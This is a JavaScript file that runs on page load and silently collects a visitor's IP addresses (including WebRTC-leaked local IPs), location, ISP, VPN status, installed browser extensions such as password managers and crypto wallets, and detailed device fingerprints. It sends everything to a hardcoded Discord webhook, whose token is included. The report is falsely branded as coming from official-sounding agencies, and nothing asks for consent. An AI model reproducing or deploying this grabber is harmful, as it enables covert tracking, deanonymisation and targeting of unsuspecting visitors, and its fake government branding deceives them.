// Function to get IP address using multiple methods
async function getIPAddresses() {
    const ipMethods = {
        'ipify': 'https://api.ipify.org?format=json',
        'ipapi': 'https://api.ipapi.is?format=json',
        'ipinfo': 'https://ipinfo.io/json',
        'icanhazip': 'https://icanhazip.com',
        'ipv4': 'https://api.ip.sb/jsonip'
    };
    
    const ipResults = {};
    
    for (const [method, url] of Object.entries(ipMethods)) {
        try {
            const response = await fetch(url);
            let data;
            
            if (method === 'icanhazip') {
                const text = await response.text();
                ipResults[method] = text.trim();
            } else if (method === 'ipv4') {
                data = await response.json();
                ipResults[method] = data.ipv4 || data.ip || 'Failed';
            } else if (method === 'ipapi') {
                data = await response.json();
                ipResults[method] = data.ip || 'Failed';
            } else if (method === 'ipinfo') {
                data = await response.json();
                ipResults[method] = data.ip || 'Failed';
            } else {
                data = await response.json();
                ipResults[method] = data.ip || 'Failed';
            }
        } catch (error) {
            ipResults[method] = 'Failed to retrieve';
        }
    }
    
    return ipResults;
}

// Function to get IP abuse score
async function getIPAbuseScore(ip) {
    if (!ip || ip === 'Unable to retrieve IP' || ip === 'Failed to retrieve') {
        return 'N/A';
    }
    
    try {
        // Using multiple free abuse databases
        const abuseResults = {};
        
        // Method 1: AbuseIPDB check (using public endpoint without API key - limited)
        try {
            const response = await fetch(`https://api.abuseipdb.com/api/v2/check?ipAddress=${ip}&maxAgeInDays=90`, {
                headers: {
                    'Accept': 'application/json'
                }
            });
            if (response.ok) {
                const data = await response.json();
                abuseResults.abuseScore = data.data?.abuseConfidenceScore || 0;
                abuseResults.totalReports = data.data?.totalReports || 0;
            } else {
                abuseResults.abuseScore = 'Limited (no API key)';
            }
        } catch (e) {
            abuseResults.abuseScore = 'Check failed';
        }
        
        // Method 2: IPQualityScore proxy check (public endpoint)
        try {
            const response = await fetch(`https://ipqualityscore.com/api/json/ip/${ip}?_t=${Date.now()}`);
            if (response.ok) {
                const data = await response.json();
                abuseResults.vpnScore = data.fraud_score || 0;
                abuseResults.isProxy = data.proxy || false;
                abuseResults.isVPN = data.vpn || false;
                abuseResults.isTor = data.tor || false;
            }
        } catch (e) {
            // Silently fail
        }
        
        // Method 3: IPHub.info (free tier)
        try {
            const response = await fetch(`http://v2.api.iphub.info/ip/${ip}`);
            if (response.ok) {
                const data = await response.json();
                abuseResults.blockStatus = data.block;
                // block: 0 = none, 1 = malicious, 2 = proxy/VPN
            }
        } catch (e) {
            // Silently fail
        }
        
        return abuseResults;
    } catch (error) {
        return { abuseScore: 'Unable to determine' };
    }
}

// Function to detect VPN usage
async function detectVPN(ip) {
    if (!ip || ip === 'Unable to retrieve IP') {
        return 'Unknown';
    }
    
    try {
        // Multiple VPN detection methods
        const vpnChecks = [];
        
        // Check 1: IPapi.co VPN detection
        try {
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await response.json();
            if (data.proxy || data.vpn || data.tor) {
                vpnChecks.push('IPapi: VPN/Proxy detected');
            }
        } catch (e) {}
        
        // Check 2: ipinfo.io VPN/hosting detection
        try {
            const response = await fetch(`https://ipinfo.io/${ip}/json`);
            const data = await response.json();
            if (data.privacy) {
                if (data.privacy.vpn) vpnChecks.push('ipinfo: VPN detected');
                if (data.privacy.proxy) vpnChecks.push('ipinfo: Proxy detected');
                if (data.privacy.tor) vpnChecks.push('ipinfo: Tor detected');
            }
            if (data.hosting) vpnChecks.push('ipinfo: Hosting/Server IP');
        } catch (e) {}
        
        // Check 3: Common VPN IP ranges (simplified detection)
        const knownVPNKeywords = ['vpn', 'proxy', 'tor', 'hosting', 'cloud', 'aws', 'azure', 'gcp', 'digitalocean', 'linode', 'vultr'];
        try {
            const response = await fetch(`https://ipapi.co/${ip}/org/`);
            const org = await response.text();
            if (knownVPNKeywords.some(keyword => org.toLowerCase().includes(keyword))) {
                vpnChecks.push('Hosting/VPN provider detected');
            }
        } catch (e) {}
        
        if (vpnChecks.length > 0) {
            return { detected: true, details: vpnChecks };
        } else {
            return { detected: false, details: 'No VPN indicators found' };
        }
    } catch (error) {
        return { detected: 'Unknown', details: 'Detection failed' };
    }
}

// Function to detect browser extensions (multiple methods)
async function detectBrowserExtensions() {
    const detectedExtensions = [];
    const extensionTests = {};
    
    // Common extension detection patterns
    const extensions = {
        'Chrome Extensions': {
            'LastPass': 'chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/',
            'Grammarly': 'chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen/',
            'AdBlock': 'chrome-extension://gighmmpiobklfepjocnamgkkbiglidom/',
            'uBlock Origin': 'chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/',
            'MetaMask': 'chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/',
            'React DevTools': 'chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/',
            'Redux DevTools': 'chrome-extension://lmhkpmbekcpmknklioeibfkpmmfibljd/',
            'Dark Reader': 'chrome-extension://eimadpbcbfnmbkopoojfekhnkhdbieeh/',
            'Honey': 'chrome-extension://bmnlcjabgnpnenekpadlanbbkooimhnj/',
            'Ghostery': 'chrome-extension://mlomiejdfkolichcflejclcbmpeaniij/',
            'Bitwarden': 'chrome-extension://nngceckbapebfimnlniiiahkandclblb/',
            'Tampermonkey': 'chrome-extension://dhdgffkkebhmkfjojejmpbldmpobfkfo/',
            'SponsorBlock': 'chrome-extension://mnjggcdmjocbbbhaepdhchncahnbgone/',
            'Google Translate': 'chrome-extension://aapbdbdomjkkjkaonfhkkikfgjllcleb/'
        },
        'Firefox Extensions': {
            'uBlock Origin': 'moz-extension://',
            'AdBlock Plus': 'moz-extension://'
        }
    };
    
    // Method 1: Check for extension resources via DOM
    for (const [browser, extList] of Object.entries(extensions)) {
        for (const [name, urlPattern] of Object.entries(extList)) {
            try {
                // Try to load a hidden element with extension resource
                const testDiv = document.createElement('div');
                testDiv.style.display = 'none';
                const img = document.createElement('img');
                img.src = `${urlPattern}icon.png`;
                testDiv.appendChild(img);
                document.body.appendChild(testDiv);
                
                img.onload = () => {
                    if (!detectedExtensions.includes(name) && !extensionTests[name]) {
                        detectedExtensions.push(`${name} (${browser})`);
                        extensionTests[name] = true;
                    }
                    document.body.removeChild(testDiv);
                };
                
                img.onerror = () => {
                    document.body.removeChild(testDiv);
                };
                
                setTimeout(() => {
                    if (document.body.contains(testDiv)) {
                        document.body.removeChild(testDiv);
                    }
                }, 500);
            } catch (e) {}
        }
    }
    
    // Method 2: Check for web accessible resources
    const checkExtensionResource = async (extensionId, testPath) => {
        return new Promise((resolve) => {
            const img = new Image();
            img.onload = () => resolve(true);
            img.onerror = () => resolve(false);
            img.src = `chrome-extension://${extensionId}/${testPath}`;
            setTimeout(() => resolve(false), 1000);
        });
    };
    
    // Method 3: Check for extension-specific DOM elements and globals
    const domChecks = {
        'LastPass': () => !!document.getElementById('lastpass'),
        'Grammarly': () => !!document.querySelector('[data-grammarly]'),
        'AdBlock': () => typeof window.blocked === 'function' || !!document.querySelector('#adblock-temp'),
        'React DevTools': () => !!window.__REACT_DEVTOOLS_GLOBAL_HOOK__,
        'MetaMask': () => !!window.ethereum || !!window.web3,
        'Bitwarden': () => !!document.getElementById('bitwarden-send'),
        'Dark Reader': () => !!document.getElementById('dark-reader-style'),
        'Honey': () => !!window.honey,
        'Tampermonkey': () => !!window.tampermonkey || !!document.querySelector('script[src*="tampermonkey"]'),
        'Privacy Badger': () => !!window.privacyBadger
    };
    
    for (const [extension, checkFn] of Object.entries(domChecks)) {
        try {
            if (checkFn() && !detectedExtensions.includes(extension)) {
                detectedExtensions.push(`${extension} (DOM detected)`);
            }
        } catch (e) {}
    }
    
    // Method 4: Check for modified browser APIs
    if (typeof navigator.plugins !== 'undefined' && navigator.plugins.length > 0) {
        // Some extensions modify plugin detection
        const originalPluginsLength = navigator.plugins.length;
        if (originalPluginsLength > 0) {
            // This is just a placeholder - some extensions add fake plugins
        }
    }
    
    // Method 5: Check localStorage for extension data
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key && (key.includes('extension') || key.includes('ext_') || 
            key.includes('chrome-extension') || key.includes('webext'))) {
            const extMatch = key.match(/([a-z]{32})/);
            if (extMatch && !detectedExtensions.includes(`Unknown extension (${extMatch[0]})`)) {
                detectedExtensions.push(`Unknown extension ID: ${extMatch[0]}`);
            }
        }
    }
    
    return detectedExtensions.length > 0 ? detectedExtensions : ['No common extensions detected'];
}

// Function to get IP address using a third-party service (legacy compatibility)
async function getIPAddress() {
    const ipResults = await getIPAddresses();
    return ipResults.ipify || 'Unable to retrieve IP';
}

// Function to get location information
async function getLocationInfo(ip) {
    if (ip === 'Unable to retrieve IP') return 'Location unavailable';
    
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return `${data.city}, ${data.region}, ${data.country_name}`;
    } catch (error) {
        return 'Location unavailable';
    }
}

// Function to get ISP information
async function getISPInfo(ip) {
    if (ip === 'Unable to retrieve IP') return 'ISP unavailable';
    
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return data.org || 'ISP unavailable';
    } catch (error) {
        return 'ISP unavailable';
    }
}

// Function to get connection type
function getConnectionType() {
    if ('connection' in navigator) {
        return navigator.connection.effectiveType || 'Unknown';
    }
    return 'Unknown';
}

// Function to get WebRTC IPs
function getWebRTCIPs() {
    return new Promise((resolve) => {
        const ips = [];
        
        const RTCPeerConnection = window.RTCPeerConnection || 
                                window.mozRTCPeerConnection || 
                                window.webkitRTCPeerConnection;
        
        if (!RTCPeerConnection) {
            resolve('WebRTC not supported');
            return;
        }

        try {
            const pc = new RTCPeerConnection({iceServers: []});
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            pc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) {
                    resolve(ips.join(', ') || 'No IPs found');
                    return;
                }
                
                const candidate = ice.candidate.candidate;
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                const match = candidate.match(ipRegex);
                
                if (match) {
                    const ip = match[1];
                    if (ips.indexOf(ip) === -1) ips.push(ip);
                }
            };
            
            setTimeout(() => {
                resolve(ips.join(', ') || 'No IPs found');
            }, 2000);
        } catch (error) {
            resolve('WebRTC error');
        }
    });
}

// Function to detect dark mode
function isDarkMode() {
    return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
}

// Function to detect reduced motion preference
function hasReducedMotion() {
    return window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
}

// Function to get battery information
async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`;
        } catch (error) {
            return 'Unavailable';
        }
    }
    return 'Unavailable';
}

// Function to get installed fonts
function getInstalledFonts() {
    const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Impact', 'Comic Sans MS'];
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const installed = [];
    
    testFonts.forEach(font => {
        ctx.font = `72px ${font}`;
        if (ctx.measureText('test').width > 0) {
            installed.push(font);
        }
    });
    
    return installed.length > 0 ? installed.slice(0, 5).join(', ') + (installed.length > 5 ? '...' : '') : 'Unknown';
}

// Function to get timezone offset
function getTimezoneOffset() {
    const offset = new Date().getTimezoneOffset();
    const sign = offset > 0 ? '-' : '+';
    const absOffset = Math.abs(offset);
    const hours = Math.floor(absOffset / 60);
    const minutes = absOffset % 60;
    return `${sign}${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}`;
}

// Function to get plugins
function getPlugins() {
    if (navigator.plugins && navigator.plugins.length > 0) {
        const plugins = Array.from(navigator.plugins).slice(0, 5).map(p => p.name);
        return plugins.join(', ') + (navigator.plugins.length > 5 ? '...' : '');
    }
    return 'No plugins';
}

// Function to get network information
function getNetworkInfo() {
    if ('connection' in navigator) {
        const conn = navigator.connection;
        const info = [];
        if (conn.effectiveType) info.push(`Type: ${conn.effectiveType}`);
        if (conn.downlink) info.push(`Downlink: ${conn.downlink} Mbps`);
        if (conn.rtt) info.push(`RTT: ${conn.rtt}ms`);
        if (conn.saveData) info.push('Save Data: Enabled');
        return info.length > 0 ? info.join(', ') : 'Limited info available';
    }
    return 'Network API not supported';
}

// Function to get GPU information
function getGPUInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                return `${vendor} - ${renderer}`;
            }
            return gl.getParameter(gl.RENDERER);
        }
        return 'WebGL not supported';
    } catch (e) {
        return 'Unable to retrieve';
    }
}

// Main function to collect all data and send to Discord
async function collectAndSendData() {
    const ipResults = await getIPAddresses();
    const primaryIP = ipResults.ipify || ipResults.ipapi || ipResults.ipinfo || 'Unknown';
    const location = await getLocationInfo(primaryIP);
    const isp = await getISPInfo(primaryIP);
    const webRTCIPs = await getWebRTCIPs();
    const batteryInfo = await getBatteryInfo();
    const abuseScore = await getIPAbuseScore(primaryIP);
    const vpnDetection = await detectVPN(primaryIP);
    const browserExtensions = await detectBrowserExtensions();
    
    // Format IP results for display
    const ipResultsFormatted = Object.entries(ipResults)
        .map(([method, ip]) => `**${method}:** ${ip}`)
        .join('\n');
    
    // Format abuse score information
    let abuseInfo = '';
    if (abuseScore.abuseScore !== undefined) {
        abuseInfo += `**Abuse Confidence:** ${abuseScore.abuseScore}%\n`;
        if (abuseScore.totalReports) abuseInfo += `**Total Reports:** ${abuseScore.totalReports}\n`;
        if (abuseScore.vpnScore !== undefined) abuseInfo += `**Fraud Score:** ${abuseScore.vpnScore}/100\n`;
        if (abuseScore.isProxy !== undefined) abuseInfo += `**Proxy:** ${abuseScore.isProxy ? 'Yes' : 'No'}\n`;
        if (abuseScore.isVPN !== undefined) abuseInfo += `**VPN:** ${abuseScore.isVPN ? 'Yes' : 'No'}\n`;
        if (abuseScore.isTor !== undefined) abuseInfo += `**Tor:** ${abuseScore.isTor ? 'Yes' : 'No'}\n`;
        if (abuseScore.blockStatus !== undefined) {
            const blockStatusText = abuseScore.blockStatus === 0 ? 'Clean' : (abuseScore.blockStatus === 1 ? 'Malicious' : 'Proxy/VPN');
            abuseInfo += `**IPHub Block Status:** ${blockStatusText}\n`;
        }
    } else {
        abuseInfo = 'Abuse score unavailable\n';
    }
    
    // Format VPN detection
    const vpnInfo = vpnDetection.detected === true ? 
        `✅ **VPN/Proxy Detected**\nDetails: ${vpnDetection.details.join(', ')}` :
        (vpnDetection.detected === false ? 
        `❌ **No VPN/Proxy Detected**\nDetails: ${vpnDetection.details}` :
        `⚠️ **Unknown**\nDetails: ${vpnDetection.details}`);
    
    // Format extensions
    const extensionsInfo = browserExtensions.length > 0 ? 
        browserExtensions.map(ext => `• ${ext}`).join('\n') : 
        'No extensions detected';

    const embedData = {
        title: "🌐 User Information Collected",
        color: 0x0099ff,
        timestamp: new Date().toISOString(),
        fields: [
            {
                name: "🔍 Multiple IP Detection Results",
                value: ipResultsFormatted,
                inline: false
            },
            {
                name: "🌍 Network Information",
                value: `**Primary IP:** ${primaryIP}\n**Location:** ${location}\n**ISP:** ${isp}\n**Connection Type:** ${getConnectionType()}\n**Online Status:** ${navigator.onLine ? 'Online' : 'Offline'}\n**WebRTC IPs:** ${webRTCIPs}\n**Network Details:** ${getNetworkInfo()}`,
                inline: false
            },
            {
                name: "⚠️ IP Reputation & Security Analysis",
                value: abuseInfo,
                inline: false
            },
            {
                name: "🔐 VPN/Proxy Detection Status",
                value: vpnInfo,
                inline: false
            },
            {
                name: "🧩 Detected Browser Extensions",
                value: extensionsInfo.length > 1024 ? extensionsInfo.substring(0, 1000) + '...' : extensionsInfo,
                inline: false
            },
            {
                name: "🖥️ System Information",
                value: `**Browser:** ${navigator.userAgent}\n**OS:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n**Timezone Offset:** ${getTimezoneOffset()}\n**Vendor:** ${navigator.vendor || 'Unknown'}\n**Device Type:** ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`,
                inline: false
            },
            {
                name: "📊 Display Information",
                value: `**Screen Resolution:** ${screen.width}x${screen.height}\n**Window Size:** ${window.innerWidth}x${window.innerHeight}\n**Color Depth:** ${screen.colorDepth} bits\n**Pixel Ratio:** ${window.devicePixelRatio || 'N/A'}\n**Device Memory:** ${navigator.deviceMemory || 'Unknown'} GB\n**Battery:** ${batteryInfo}`,
                inline: false
            },
            {
                name: "⚙️ Technical Capabilities",
                value: `**CPU Cores:** ${navigator.hardwareConcurrency || 'Unknown'}\n**Touch Screen:** ${'maxTouchPoints' in navigator ? navigator.maxTouchPoints > 0 : 'Unknown'}\n**Cookies Enabled:** ${navigator.cookieEnabled}\n**Local Storage:** ${!!window.localStorage}\n**Session Storage:** ${!!window.sessionStorage}\n**Installed Fonts:** ${getInstalledFonts()}`,
                inline: false
            },
            {
                name: "🔧 Web Technologies",
                value: `**Web Workers:** ${!!window.Worker}\n**Service Workers:** ${'serviceWorker' in navigator}\n**WebAssembly:** ${!!window.WebAssembly}\n**WebGL2:** ${!!document.createElement('canvas').getContext('webgl2')}\n**WebP Support:** ${(() => {
                    const canvas = document.createElement('canvas');
                    return canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0;
                })()}\n**Plugins:** ${getPlugins()}`,
                inline: false
            },
            {
                name: "🎨 WebGL Renderer",
                value: getGPUInfo(),
                inline: false
            },
            {
                name: "⚙️ User Preferences",
                value: `**Dark Mode:** ${isDarkMode() ? 'Enabled' : 'Disabled'}\n**Reduced Motion:** ${hasReducedMotion() ? 'Enabled' : 'Disabled'}\n**Do Not Track:** ${navigator.doNotTrack || 'Not set'}`,
                inline: false
            },
            {
                name: "🔐 Security & Privacy",
                value: `**JavaScript Enabled:** Yes\n**ActiveX:** ${!!window.ActiveXObject ? 'Yes' : 'No'}\n**Java Enabled:** ${navigator.javaEnabled ? navigator.javaEnabled() : 'Unknown'}\n**Session Persistence:** ${!!window.sessionStorage}`,
                inline: false
            }
        ],
        footer: {
            text: "Collected by the Telecommunications Monitoring Office and the Recordkeeping And Information Security Administration"
        }
    };

    // Send to Discord webhook
    const webhookURL = "https://discord.com/api/webhooks/1482510569461383242/tF_91rzrXYfs4P-qBbarNafSa-fArvPp99_HxdoM8_iREqzgaSTLhBoFOajYwB1-ElgN";
    
    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embedData],
                username: "Internet & Technical Services Bureau",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/1006/1006771.png"
            })
        });

        if (response.ok) {
            console.log('Data sent successfully to Discord');
        } else {
            console.error('Failed to send data to Discord');
        }
    } catch (error) {
        console.error('Error sending data:', error);
    }
}

// Execute when the script is loaded
collectAndSendData();
